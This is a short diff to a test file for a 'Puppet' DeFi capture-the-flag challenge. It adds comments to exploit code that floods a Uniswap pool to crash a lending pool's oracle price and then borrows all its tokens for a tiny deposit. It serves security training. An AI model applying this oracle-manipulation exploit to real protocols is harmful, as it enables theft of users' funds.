@@ -103,10 +103,12 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        // Flood the pool with tokens. This will drive down PuppetPool's "oracle price"
         await this.uniswapExchange.connect(attacker)
             .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), "1", (await ethers.provider.getBlock('latest')).timestamp * 2)
 
         const amountToSteal = await this.token.balanceOf(this.lendingPool.address)
+        // deposit required will be small now that the uniswap pool's token balance is huge.
         const deposit = await this.lendingPool.calculateDepositRequired(amountToSteal)
 
         await this.lendingPool.connect(attacker).borrow(amountToSteal, {value: deposit})
